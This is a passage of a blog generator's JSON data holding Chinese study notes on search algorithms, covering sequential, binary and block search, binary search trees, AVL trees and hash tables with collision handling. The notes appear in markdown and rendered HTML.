class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">C</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">hi</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num=<span class=\"number\">1</span>;<span class=\"comment\">//等价于public static final int num =1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">C</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">bye</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test1</span> <span class=\"keyword\">implements</span> <span class=\"title\">B</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">hi</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">bye</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"9-接口的修饰符只能是public和默认-这点和类的修饰符是一样的\"><a href=\"#9-接口的修饰符只能是public和默认-这点和类的修饰符是一样的\" class=\"headerlink\" title=\"9.接口的修饰符只能是public和默认,这点和类的修饰符是一样的\"></a>9.接口的修饰符只能是public和默认,这点和类的修饰符是一样的</h5>"},{"title":"查找","date":"2021-12-30T08:25:42.000Z","typora-root-url":"..","_content":"\n#### ASL总结:\n\n无序表查找ASL:顺序查找ASL=(n+1)/2\n\n有序表折半查找ASL=log<sub>2</sub>(n+1)-1\n\n散列表上\n\n- 完全无冲突,ASL=1\n- 有冲突具体计算\n\nASL取决于\n\n1. 散列函数\n2. 处理冲突的方法\n3. 散列表的装填因子α\n\nα=表中填入的记录数/哈希表的长度\n\nα越大,表中记录数越多,说明表装得约满,发生冲突的可能性就越大,查找时比较次数就越多\n\n<!--more-->\n\n##### 查找定义:\n\n根据给定的某个值,在查找表中确定一个其关键字等于给定值的数据元素或记录\n\n##### 关键字\n\n用来标识一个数据元素(或记录)的某个数据项的值\n\n主关键字: 可唯一的标识一个记录的关键字\n\n次关键字: 用以识别若干记录的关键字\n\n静态查找表:仅作\"查询\"操作的查找表\n\n动态查找表:作\"插入\"和\"删除\"操作的查找表\n\n##### 如何评价查找算法\n\n关键字的平均比较次数,也称**平均查找长度ASL**\n\n<img src=\"../images/%E6%9F%A5%E6%89%BE/image-20211230163613538.png\" alt=\"image-20211230163613538\" style=\"zoom:67%;\" />\n\n### 顺序查找\n\n优点:算法简单,逻辑次序无要求,且不同存储结构均适用\n\n缺点:ASL太大,**ASL=(n+1)/2**\n\n时间复杂度O(n)\n\n##### 应用范围\n\n顺序表或线性链表表示的静态查找表\n\n表内元素之间无序\n\n##### 设置哨兵的顺序查找\n\n当数据元素特别大的时候，每次循环少进行一次越界判断，这样会节省几乎一般的时间。\n\n##### 记录的查找概率不相等时如何提高查找效率\n\n按照查找概率高低存储\n\n##### 记录的查找概率无法测定时如何提高查找效率\n\n按查找概率动态调整记录顺序\n\n1)在每个记录中设一个访问频度域\n\n2)始终保持记录按非递增有序的次序排列\n\n3)每次查找后均将刚查到的记录直接移至表头\n\n### 折半查找\n\n特点:每次将待查记录所在区间缩小一半\n\n**ASL=log<sub>2</sub>(n+1)-1**\n\n缺点:只适合有序表且仅限于顺序存储结构\n\n时间复杂度O(log<sub>2</sub>(n))\n\nmid=(low+high)/2\n\nkey<mid则:high=mid-1\n\nkey>mid则:low=mid+1\n\nkey=mid,找到\n\nhigh<low,结束,未找到\n\n判定树,按照查找次数和层数对应建树\n\n比较次数<=树的深度\n\n满二叉树深度D=log<sub>2</sub>(n)+1\n\n![image-20211230172538718](/images/%E6%9F%A5%E6%89%BE/image-20211230172538718.png)\n\n### 分块查找\n\n优点:插入和删除比较容易,无需进行大量移动\n\n缺点:要增加一个索引表的存储空间并对厨师索引表进行排序运算\n\n适用情况:如果线性表既要快速查找又经常动态变化,则可采用分块查找\n\n步骤:\n\n1.将表分成几块,表或者有序,或者分块有序(第二块中所有元素值比第一块大)\n\n2.建立索引表\n\n\n\n\n\n#### 二叉排序树\n\n又称为二叉搜索树,二叉查找树\n\n二叉排序树或是空树,或是满足如下性质的二叉树:\n\n- 若其左子树非空,则左子树上所有结点的值均小于根节点的值\n- 若其右子树为空,则右子树上所有结点的值均大于等于根节点的值\n- 其左右子树本身又各是一棵二叉排序树\n\n```c++\nBStree SearchBST(BSTree T,KeyType key){\n    if((!T)||key==T->data.key) return T;\n    else if(key<T->data.key)\n        return SearchBST(T->lchild,key);\n    else return SearchBST(T->rchild,key);\n}\n```\n\nASL\n\n二叉排序树每层各个结点的比较次数等于该层高度\n\n含有n个结点的二叉排序树的平均查找长度和树的形态有关\n\n**最好情况**,形态比较均衡,ASL=log2(n+1)-1;\n\nO(log<sub>2</sub>(n))\n\n\n\n**最坏情况**:,单支树,退化成顺序查找\n\nASL=(n+1)/2\n\nO(n)\n\n**不同插入次序的序列生成不同形态的二叉排序树**\n\n二叉排序树---插入操作\n\n根据大小选择左右子树,找到某个叶子结点的左子树或者右子树为空,则插入节点为该叶子结点的左孩子或者右孩子\n\n二叉排序树---删除操作\n\n- 被删除的节点是叶子结点,直接删除即可\n\n- 被删除的节点只有左子树或者只有右子树,用其左子树或者右子树替换它即可\n- 被删除的节点既有左子树,也有右子树\n\n用它中序遍历序列的前驱来代替它,前驱是左子树中最大的结点\n\n也可以用其后继替换之,后继是右子树中最小的结点\n\n\n\n#### 平衡二叉树\n\n平衡二叉树又称AVL树,一棵平衡二叉树或者是空树,或者是具有下列性质的二叉排序树:\n\n- 左子树与右子树的高度之差的绝对值小于等于1\n- 左子树和右子树也是平衡二叉排序树\n\n平衡因子=结点左子树的高度-结点右子树的高度\n\n**对于一棵有n个结点的AVL树,其高度保持在O(log2(n))数量级,ASL也保持在O(log2(n))量级**\n\n\n\n失衡调整\n\n- LL\n- LR\n- RL\n- RR\n\n调整原则:自己慢慢分析,没必要背口诀\n\n- 降低高度\n- 保持二叉排序树性质(一般都是选取中等大小的节点上升)\n- 出现多个平衡因子绝对值相等的失衡节点,找最小的失衡子树进行调整\n- 失去父节点的子节点尽量更换到跟自己差值比较小的父节点\n\n根据所给序列建立平衡二叉树时,需要边插入边检查是否失衡,并进行调整\n\n\n\n#### 散列表查找\n\n优点:查找效率高\n\n缺点:空间效率低\n\n散列表基本思想:记录的存储位置与关键字之间存在对应关系\n\n##### 冲突\n\n不同关键字映射到同一个散列地址\n\n##### 好的散列函数应满足\n\n- 所选函数尽可能简单,以便提高转换速度\n- 所选函数对关键码计算出的地址,应在整个地址区间中均匀分布,以减少空间浪费\n\n##### 一些常见方法\n\n​\t1.直接定址法\n\nhash(key)=a key+b\n\n优点:以关键字的某个线性函数值为散列地址,不会产生冲突\n\n缺点:浪费空间\n\n​\t2.除留余数法\n\nhash(key)=key mod p\n\n**选取p的技巧**\n\n设表长为m,取p<=m且p为质数\n\n### 常用解决冲突的方法\n\n#### 开放地址法\n\n基本思想:有冲突的时候就去寻找下一个空的散列地址,只要散列表足够大,空的散列地址总能找到,并将数据元素存入\n\n例如:除留余数法 H<sub>i</sub>=(Hash(key)+d<sub>i</sub>)mod m,d<sub>i</sub>为增量序列\n\n**常用方法**\n\nα=表中填入的记录数/哈希表的长度\n\n![image-20211231011652431](/images/%E6%9F%A5%E6%89%BE/image-20211231011652431.png)\n\n##### 线性探测法\n\n增量序列d<sub>i</sub>为线性序列\n\n##### 二次探测法\n\n增量序列d<sub>i</sub>为二次序列1²,(-1)², 2², (-2)²  ....  ,q² 二次序列\n\n##### 伪随机探测法\n\n增量序列d<sub>i</sub>为伪随机数\n\n#### 再哈希法\n\n\n\n#### 链地址法(拉链法)\n\n**优点:**\n\n1.非同义词不会冲突,无\"聚集\"现象\n\n2.链表上节点空间动态申请,更适合于表长不确定的情况\n\n基本思想:相同散列地址的记录链成一单链表\n\nm个散列地址就设m个单链表,然后用一个数组将m个单链表的表头指针存储起来,形成一个动态的结构\n\n#### 建立一个公共溢出区\n","source":"_posts/查找.md","raw":"---\ntitle: 查找\ndate: 2021-12-30 16:25:42\ntags:\ncategories:\n \ntypora-root-url: ..\n---\n\n#### ASL总结:\n\n无序表查找ASL:顺序查找ASL=(n+1)/2\n\n有序表折半查找ASL=log<sub>2</sub>(n+1)-1\n\n散列表上\n\n- 完全无冲突,ASL=1\n- 有冲突具体计算\n\nASL取决于\n\n1. 散列函数\n2. 处理冲突的方法\n3. 散列表的装填因子α\n\nα=表中填入的记录数/哈希表的长度\n\nα越大,表中记录数越多,说明表装得约满,发生冲突的可能性就越大,查找时比较次数就越多\n\n<!--more-->\n\n##### 查找定义:\n\n根据给定的某个值,在查找表中确定一个其关键字等于给定值的数据元素或记录\n\n##### 关键字\n\n用来标识一个数据元素(或记录)的某个数据项的值\n\n主关键字: 可唯一的标识一个记录的关键字\n\n次关键字: 用以识别若干记录的关键字\n\n静态查找表:仅作\"查询\"操作的查找表\n\n动态查找表:作\"插入\"和\"删除\"操作的查找表\n\n##### 如何评价查找算法\n\n关键字的平均比较次数,也称**平均查找长度ASL**\n\n<img src=\"../images/%E6%9F%A5%E6%89%BE/image-20211230163613538.png\" alt=\"image-20211230163613538\" style=\"zoom:67%;\" />\n\n### 顺序查找\n\n优点:算法简单,逻辑次序无要求,且不同存储结构均适用\n\n缺点:ASL太大,**ASL=(n+1)/2**\n\n时间复杂度O(n)\n\n##### 应用范围\n\n顺序表或线性链表表示的静态查找表\n\n表内元素之间无序\n\n##### 设置哨兵的顺序查找\n\n当数据元素特别大的时候，每次循环少进行一次越界判断，这样会节省几乎一般的时间。\n\n##### 记录的查找概率不相等时如何提高查找效率\n\n按照查找概率高低存储\n\n##### 记录的查找概率无法测定时如何提高查找效率\n\n按查找概率动态调整记录顺序\n\n1)在每个记录中设一个访问频度域\n\n2)始终保持记录按非递增有序的次序排列\n\n3)每次查找后均将刚查到的记录直接移至表头\n\n### 折半查找\n\n特点:每次将待查记录所在区间缩小一半\n\n**ASL=log<sub>2</sub>(n+1)-1**\n\n缺点:只适合有序表且仅限于顺序存储结构\n\n时间复杂度O(log<sub>2</sub>(n))\n\nmid=(low+high)/2\n\nkey<mid则:high=mid-1\n\nkey>mid则:low=mid+1\n\nkey=mid,找到\n\nhigh<low,结束,未找到\n\n判定树,按照查找次数和层数对应建树\n\n比较次数<=树的深度\n\n满二叉树深度D=log<sub>2</sub>(n)+1\n\n![image-20211230172538718](/images/%E6%9F%A5%E6%89%BE/image-20211230172538718.png)\n\n### 分块查找\n\n优点:插入和删除比较容易,无需进行大量移动\n\n缺点:要增加一个索引表的存储空间并对厨师索引表进行排序运算\n\n适用情况:如果线性表既要快速查找又经常动态变化,则可采用分块查找\n\n步骤:\n\n1.将表分成几块,表或者有序,或者分块有序(第二块中所有元素值比第一块大)\n\n2.建立索引表\n\n\n\n\n\n#### 二叉排序树\n\n又称为二叉搜索树,二叉查找树\n\n二叉排序树或是空树,或是满足如下性质的二叉树:\n\n- 若其左子树非空,则左子树上所有结点的值均小于根节点的值\n- 若其右子树为空,则右子树上所有结点的值均大于等于根节点的值\n- 其左右子树本身又各是一棵二叉排序树\n\n```c++\nBStree SearchBST(BSTree T,KeyType key){\n    if((!T)||key==T->data.key) return T;\n    else if(key<T->data.key)\n        return SearchBST(T->lchild,key);\n    else return SearchBST(T->rchild,key);\n}\n```\n\nASL\n\n二叉排序树每层各个结点的比较次数等于该层高度\n\n含有n个结点的二叉排序树的平均查找长度和树的形态有关\n\n**最好情况**,形态比较均衡,ASL=log2(n+1)-1;\n\nO(log<sub>2</sub>(n))\n\n\n\n**最坏情况**:,单支树,退化成顺序查找\n\nASL=(n+1)/2\n\nO(n)\n\n**不同插入次序的序列生成不同形态的二叉排序树**\n\n二叉排序树---插入操作\n\n根据大小选择左右子树,找到某个叶子结点的左子树或者右子树为空,则插入节点为该叶子结点的左孩子或者右孩子\n\n二叉排序树---删除操作\n\n- 被删除的节点是叶子结点,直接删除即可\n\n- 被删除的节点只有左子树或者只有右子树,用其左子树或者右子树替换它即可\n- 被删除的节点既有左子树,也有右子树\n\n用它中序遍历序列的前驱来代替它,前驱是左子树中最大的结点\n\n也可以用其后继替换之,后继是右子树中最小的结点\n\n\n\n#### 平衡二叉树\n\n平衡二叉树又称AVL树,一棵平衡二叉树或者是空树,或者是具有下列性质的二叉排序树:\n\n- 左子树与右子树的高度之差的绝对值小于等于1\n- 左子树和右子树也是平衡二叉排序树\n\n平衡因子=结点左子树的高度-结点右子树的高度\n\n**对于一棵有n个结点的AVL树,其高度保持在O(log2(n))数量级,ASL也保持在O(log2(n))量级**\n\n\n\n失衡调整\n\n- LL\n- LR\n- RL\n- RR\n\n调整原则:自己慢慢分析,没必要背口诀\n\n- 降低高度\n- 保持二叉排序树性质(一般都是选取中等大小的节点上升)\n- 出现多个平衡因子绝对值相等的失衡节点,找最小的失衡子树进行调整\n- 失去父节点的子节点尽量更换到跟自己差值比较小的父节点\n\n根据所给序列建立平衡二叉树时,需要边插入边检查是否失衡,并进行调整\n\n\n\n#### 散列表查找\n\n优点:查找效率高\n\n缺点:空间效率低\n\n散列表基本思想:记录的存储位置与关键字之间存在对应关系\n\n##### 冲突\n\n不同关键字映射到同一个散列地址\n\n##### 好的散列函数应满足\n\n- 所选函数尽可能简单,以便提高转换速度\n- 所选函数对关键码计算出的地址,应在整个地址区间中均匀分布,以减少空间浪费\n\n##### 一些常见方法\n\n​\t1.直接定址法\n\nhash(key)=a key+b\n\n优点:以关键字的某个线性函数值为散列地址,不会产生冲突\n\n缺点:浪费空间\n\n​\t2.除留余数法\n\nhash(key)=key mod p\n\n**选取p的技巧**\n\n设表长为m,取p<=m且p为质数\n\n### 常用解决冲突的方法\n\n#### 开放地址法\n\n基本思想:有冲突的时候就去寻找下一个空的散列地址,只要散列表足够大,空的散列地址总能找到,并将数据元素存入\n\n例如:除留余数法 H<sub>i</sub>=(Hash(key)+d<sub>i</sub>)mod m,d<sub>i</sub>为增量序列\n\n**常用方法**\n\nα=表中填入的记录数/哈希表的长度\n\n![image-20211231011652431](/images/%E6%9F%A5%E6%89%BE/image-20211231011652431.png)\n\n##### 线性探测法\n\n增量序列d<sub>i</sub>为线性序列\n\n##### 二次探测法\n\n增量序列d<sub>i</sub>为二次序列1²,(-1)², 2², (-2)²  ....  ,q² 二次序列\n\n##### 伪随机探测法\n\n增量序列d<sub>i</sub>为伪随机数\n\n#### 再哈希法\n\n\n\n#### 链地址法(拉链法)\n\n**优点:**\n\n1.非同义词不会冲突,无\"聚集\"现象\n\n2.链表上节点空间动态申请,更适合于表长不确定的情况\n\n基本思想:相同散列地址的记录链成一单链表\n\nm个散列地址就设m个单链表,然后用一个数组将m个单链表的表头指针存储起来,形成一个动态的结构\n\n#### 建立一个公共溢出区\n","slug":"查找","published":1,"updated":"2022-01-07T13:31:06.124Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9ne002jgsw97qz6ac24","content":"<h4 id=\"ASL总结\"><a href=\"#ASL总结\" class=\"headerlink\" title=\"ASL总结:\"></a>ASL总结:</h4><p>无序表查找ASL:顺序查找ASL=(n+1)/2</p>\n<p>有序表折半查找ASL=log<sub>2</sub>(n+1)-1</p>\n<p>散列表上</p>\n<ul>\n<li>完全无冲突,ASL=1</li>\n<li>有冲突具体计算</li>\n</ul>\n<p>ASL取决于</p>\n<ol>\n<li>散列函数</li>\n<li>处理冲突的方法</li>\n<li>散列表的装填因子α</li>\n</ol>\n<p>α=表中填入的记录数/哈希表的长度</p>\n<p>α越大,表中记录数越多,说明表装得约满,发生冲突的可能性就越大,查找时比较次数就越多</p>\n<span id=\"more\"></span>\n\n<h5 id=\"查找定义\"><a href=\"#查找定义\" class=\"headerlink\" title=\"查找定义:\"></a>查找定义:</h5><p>根据给定的某个值,在查找表中确定一个其关键字等于给定值的数据元素或记录</p>\n<h5 id=\"关键字\"><a href=\"#关键字\" class=\"headerlink\" title=\"关键字\"></a>关键字</h5><p>用来标识一个数据元素(或记录)的某个数据项的值</p>\n<p>主关键字: 可唯一的标识一个记录的关键字</p>\n<p>次关键字: 用以识别若干记录的关键字</p>\n<p>静态查找表:仅作”查询”操作的查找表</p>\n<p>动态查找表:作”插入”和”删除”操作的查找表</p>\n<h5 id=\"如何评价查找算法\"><a href=\"#如何评价查找算法\" class=\"headerlink\" title=\"如何评价查找算法\"></a>如何评价查找算法</h5><p>关键字的平均比较次数,也称<strong>平均查找长度ASL</strong></p>\n<img src=\"../images/%E6%9F%A5%E6%89%BE/image-20211230163613538.png\" alt=\"image-20211230163613538\" style=\"zoom:67%;\" />\n\n<h3 id=\"顺序查找\"><a href=\"#顺序查找\" class=\"headerlink\" title=\"顺序查找\"></a>顺序查找</h3><p>优点:算法简单,逻辑次序无要求,且不同存储结构均适用</p>\n<p>缺点:ASL太大,<strong>ASL=(n+1)/2</strong></p>\n<p>时间复杂度O(n)</p>\n<h5 id=\"应用范围\"><a href=\"#应用范围\" class=\"headerlink\" title=\"应用范围\"></a>应用范围</h5><p>顺序表或线性链表表示的静态查找表</p>\n<p>表内元素之间无序</p>\n<h5 id=\"设置哨兵的顺序查找\"><a href=\"#设置哨兵的顺序查找\" class=\"headerlink\" title=\"设置哨兵的顺序查找\"></a>设置哨兵的顺序查找</h5><p>当数据元素特别大的时候，每次循环少进行一次越界判断，这样会节省几乎一般的时间。</p>\n<h5 id=\"记录的查找概率不相等时如何提高查找效率\"><a href=\"#记录的查找概率不相等时如何提高查找效率\" class=\"headerlink\" title=\"记录的查找概率不相等时如何提高查找效率\"></a>记录的查找概率不相等时如何提高查找效率</h5><p>按照查找概率高低存储</p>\n<h5 id=\"记录的查找概率无法测定时如何提高查找效率\"><a href=\"#记录的查找概率无法测定时如何提高查找效率\" class=\"headerlink\" title=\"记录的查找概率无法测定时如何提高查找效率\"></a>记录的查找概率无法测定时如何提高查找效率</h5><p>按查找概率动态调整记录顺序</p>\n<p>1)在每个记录中设一个访问频度域</p>\n<p>2)始终保持记录按非递增有序的次序排列</p>\n<p>3)每次查找后均将刚查到的记录直接移至表头</p>\n<h3 id=\"折半查找\"><a href=\"#折半查找\" class=\"headerlink\" title=\"折半查找\"></a>折半查找</h3><p>特点:每次将待查记录所在区间缩小一半</p>\n<p><strong>ASL=log<sub>2</sub>(n+1)-1</strong></p>\n<p>缺点:只适合有序表且仅限于顺序存储结构</p>\n<p>时间复杂度O(log<sub>2</sub>(n))</p>\n<p>mid=(low+high)/2</p>\n<p>key&lt;mid则:high=mid-1</p>\n<p>key&gt;mid则:low=mid+1</p>\n<p>key=mid,找到</p>\n<p>high&lt;low,结束,未找到</p>\n<p>判定树,按照查找次数和层数对应建树</p>\n<p>比较次数&lt;=树的深度</p>\n<p>满二叉树深度D=log<sub>2</sub>(n)+1</p>\n<p><img src=\"/images/%E6%9F%A5%E6%89%BE/image-20211230172538718.png\" alt=\"image-20211230172538718\"></p>\n<h3 id=\"分块查找\"><a href=\"#分块查找\" class=\"headerlink\" title=\"分块查找\"></a>分块查找</h3><p>优点:插入和删除比较容易,无需进行大量移动</p>\n<p>缺点:要增加一个索引表的存储空间并对厨师索引表进行排序运算</p>\n<p>适用情况:如果线性表既要快速查找又经常动态变化,则可采用分块查找</p>\n<p>步骤:</p>\n<p>1.将表分成几块,表或者有序,或者分块有序(第二块中所有元素值比第一块大)</p>\n<p>2.建立索引表</p>\n<h4 id=\"二叉排序树\"><a href=\"#二叉排序树\" class=\"headerlink\" title=\"二叉排序树\"></a>二叉排序树</h4><p>又称为二叉搜索树,二叉查找树</p>\n<p>二叉排序树或是空树,或是满足如下性质的二叉树:</p>\n<ul>\n<li>若其左子树非空,则左子树上所有结点的值均小于根节点的值</li>\n<li>若其右子树为空,则右子树上所有结点的值均大于等于根节点的值</li>\n<li>其左右子树本身又各是一棵二叉排序树</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">BStree <span class=\"title\">SearchBST</span><span class=\"params\">(BSTree T,KeyType key)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((!T)||key==T-&gt;data.key) <span class=\"keyword\">return</span> T;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(key&lt;T-&gt;data.key)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">SearchBST</span>(T-&gt;lchild,key);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> <span class=\"built_in\">SearchBST</span>(T-&gt;rchild,key);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ASL</p>\n<p>二叉排序树每层各个结点的比较次数等于该层高度</p>\n<p>含有n个结点的二叉排序树的平均查找长度和树的形态有关</p>\n<p><strong>最好情况</strong>,形态比较均衡,ASL=log2(n+1)-1;</p>\n<p>O(log<sub>2</sub>(n))</p>\n<p><strong>最坏情况</strong>:,单支树,退化成顺序查找</p>\n<p>ASL=(n+1)/2</p>\n<p>O(n)</p>\n<p><strong>不同插入次序的序列生成不同形态的二叉排序树</strong></p>\n<p>二叉排序树—插入操作</p>\n<p>根据大小选择左右子树,找到某个叶子结点的左子树或者右子树为空,则插入节点为该叶子结点的左孩子或者右孩子</p>\n<p>二叉排序树—删除操作</p>\n<ul>\n<li><p>被删除的节点是叶子结点,直接删除即可</p>\n</li>\n<li><p>被删除的节点只有左子树或者只有右子树,用其左子树或者右子树替换它即可</p>\n</li>\n<li><p>被删除的节点既有左子树,也有右子树</p>\n</li>\n</ul>\n<p>用它中序遍历序列的前驱来代替它,前驱是左子树中最大的结点</p>\n<p>也可以用其后继替换之,后继是右子树中最小的结点</p>\n<h4 id=\"平衡二叉树\"><a href=\"#平衡二叉树\" class=\"headerlink\" title=\"平衡二叉树\"></a>平衡二叉树</h4><p>平衡二叉树又称AVL树,一棵平衡二叉树或者是空树,或者是具有下列性质的二叉排序树:</p>\n<ul>\n<li>左子树与右子树的高度之差的绝对值小于等于1</li>\n<li>左子树和右子树也是平衡二叉排序树</li>\n</ul>\n<p>平衡因子=结点左子树的高度-结点右子树的高度</p>\n<p><strong>对于一棵有n个结点的AVL树,其高度保持在O(log2(n))数量级,ASL也保持在O(log2(n))量级</strong></p>\n<p>失衡调整</p>\n<ul>\n<li>LL</li>\n<li>LR</li>\n<li>RL</li>\n<li>RR</li>\n</ul>\n<p>调整原则:自己慢慢分析,没必要背口诀</p>\n<ul>\n<li>降低高度</li>\n<li>保持二叉排序树性质(一般都是选取中等大小的节点上升)</li>\n<li>出现多个平衡因子绝对值相等的失衡节点,找最小的失衡子树进行调整</li>\n<li>失去父节点的子节点尽量更换到跟自己差值比较小的父节点</li>\n</ul>\n<p>根据所给序列建立平衡二叉树时,需要边插入边检查是否失衡,并进行调整</p>\n<h4 id=\"散列表查找\"><a href=\"#散列表查找\" class=\"headerlink\" title=\"散列表查找\"></a>散列表查找</h4><p>优点:查找效率高</p>\n<p>缺点:空间效率低</p>\n<p>散列表基本思想:记录的存储位置与关键字之间存在对应关系</p>\n<h5 id=\"冲突\"><a href=\"#冲突\" class=\"headerlink\" title=\"冲突\"></a>冲突</h5><p>不同关键字映射到同一个散列地址</p>\n<h5 id=\"好的散列函数应满足\"><a href=\"#好的散列函数应满足\" class=\"headerlink\" title=\"好的散列函数应满足\"></a>好的散列函数应满足</h5><ul>\n<li>所选函数尽可能简单,以便提高转换速度</li>\n<li>所选函数对关键码计算出的地址,应在整个地址区间中均匀分布,以减少空间浪费</li>\n</ul>\n<h5 id=\"一些常见方法\"><a href=\"#一些常见方法\" class=\"headerlink\" title=\"一些常见方法\"></a>一些常见方法</h5><p>​    1.直接定址法</p>\n<p>hash(key)=a key+b</p>\n<p>优点:以关键字的某个线性函数值为散列地址,不会产生冲突</p>\n<p>缺点:浪费空间</p>\n<p>​    2.除留余数法</p>\n<p>hash(key)=key mod p</p>\n<p><strong>选取p的技巧</strong></p>\n<p>设表长为m,取p&lt;=m且p为质数</p>\n<h3 id=\"常用解决冲突的方法\"><a href=\"#常用解决冲突的方法\" class=\"headerlink\" title=\"常用解决冲突的方法\"></a>常用解决冲突的方法</h3><h4 id=\"开放地址法\"><a href=\"#开放地址法\" class=\"headerlink\" title=\"开放地址法\"></a>开放地址法</h4><p>基本思想:有冲突的时候就去寻找下一个空的散列地址,只要散列表足够大,空的散列地址总能找到,并将数据元素存入</p>\n<p>例如:除留余数法 H<sub>i</sub>=(Hash(key)+d<sub>i</sub>)mod m,d<sub>i</sub>为增量序列</p>\n<p><strong>常用方法</strong></p>\n<p>α=表中填入的记录数/哈希表的长度</p>\n<p><img src=\"/images/%E6%9F%A5%E6%89%BE/image-20211231011652431.png\" alt=\"image-20211231011652431\"></p>\n<h5 id=\"线性探测法\"><a href=\"#线性探测法\" class=\"headerlink\" title=\"线性探测法\"></a>线性探测法</h5><p>增量序列d<sub>i</sub>为线性序列</p>\n<h5 id=\"二次探测法\"><a href=\"#二次探测法\" class=\"headerlink\" title=\"二次探测法\"></a>二次探测法</h5><p>增量序列d<sub>i</sub>为二次序列1²,(-1)², 2², (-2)²  ….  ,q² 二次序列</p>\n<h5 id=\"伪随机探测法\"><a href=\"#伪随机探测法\" class=\"headerlink\" title=\"伪随机探测法\"></a>伪随机探测法</h5><p>增量序列d<sub>i</sub>为伪随机数</p>\n<h4 id=\"再哈希法\"><a href=\"#再哈希法\" class=\"headerlink\" title=\"再哈希法\"></a>再哈希法</h4><h4 id=\"链地址法-拉链法\"><a href=\"#链地址法-拉链法\" class=\"headerlink\" title=\"链地址法(拉链法)\"></a>链地址法(拉链法)</h4><p><strong>优点:</strong></p>\n<p>1.非同义词不会冲突,无”聚集”现象</p>\n<p>2.链表上节点空间动态申请,更适合于表长不确定的情况</p>\n<p>基本思想:相同散列地址的记录链成一单链表</p>\n<p>m个散列地址就设m个单链表,然后用一个数组将m个单链表的表头指针存储起来,形成一个动态的结构</p>\n<h4 id=\"建立一个公共溢出区\"><a href=\"#建立一个公共溢出区\" class=\"headerlink\" title=\"建立一个公共溢出区\"></a>建立一个公共溢出区</h4>","site":{"data":{}},"excerpt":"<h4 id=\"ASL总结\"><a href=\"#ASL总结\" class=\"headerlink\" title=\"ASL总结:\"></a>ASL总结:</h4><p>无序表查找ASL:顺序查找ASL=(n+1)/2</p>\n<p>有序表折半查找ASL=log<sub>2</sub>(n+1)-1</p>\n<p>散列表上</p>\n<ul>\n<li>完全无冲突,ASL=1</li>\n<li>有冲突具体计算</li>\n</ul>\n<p>ASL取决于</p>\n<ol>\n<li>散列函数</li>\n<li>处理冲突的方法</li>\n<li>散列表的装填因子α</li>\n</ol>\n<p>α=表中填入的记录数/哈希表的长度</p>\n<p>α越大,表中记录数越多,说明表装得约满,发生冲突的可能性就越大,查找时比较次数就越多</p>","more":"<h5 id=\"查找定义\"><a href=\"#查找定义\" class=\"headerlink\" title=\"查找定义:\"></a>查找定义:</h5><p>根据给定的某个值,在查找表中确定一个其关键字等于给定值的数据元素或记录</p>\n<h5 id=\"关键字\"><a href=\"#关键字\" class=\"headerlink\" title=\"关键字\"></a>关键字</h5><p>用来标识一个数据元素(或记录)的某个数据项的值</p>\n<p>主关键字: 可唯一的标识一个记录的关键字</p>\n<p>次关键字: 用以识别若干记录的关键字</p>\n<p>静态查找表:仅作”查询”操作的查找表</p>\n<p>动态查找表:作”插入”和”删除”操作的查找表</p>\n<h5 id=\"如何评价查找算法\"><a href=\"#如何评价查找算法\" class=\"headerlink\" title=\"如何评价查找算法\"></a>如何评价查找算法</h5><p>关键字的平均比较次数,也称<strong>平均查找长度ASL</strong></p>\n<img src=\"../images/%E6%9F%A5%E6%89%BE/image-20211230163613538.png\" alt=\"image-20211230163613538\" style=\"zoom:67%;\" />\n\n<h3 id=\"顺序查找\"><a href=\"#顺序查找\" class=\"headerlink\" title=\"顺序查找\"></a>顺序查找</h3><p>优点:算法简单,逻辑次序无要求,且不同存储结构均适用</p>\n<p>缺点:ASL太大,<strong>ASL=(n+1)/2</strong></p>\n<p>时间复杂度O(n)</p>\n<h5 id=\"应用范围\"><a href=\"#应用范围\" class=\"headerlink\" title=\"应用范围\"></a>应用范围</h5><p>顺序表或线性链表表示的静态查找表</p>\n<p>表内元素之间无序</p>\n<h5 id=\"设置哨兵的顺序查找\"><a href=\"#设置哨兵的顺序查找\" class=\"headerlink\" title=\"设置哨兵的顺序查找\"></a>设置哨兵的顺序查找</h5><p>当数据元素特别大的时候，每次循环少进行一次越界判断，这样会节省几乎一般的时间。</p>\n<h5 id=\"记录的查找概率不相等时如何提高查找效率\"><a 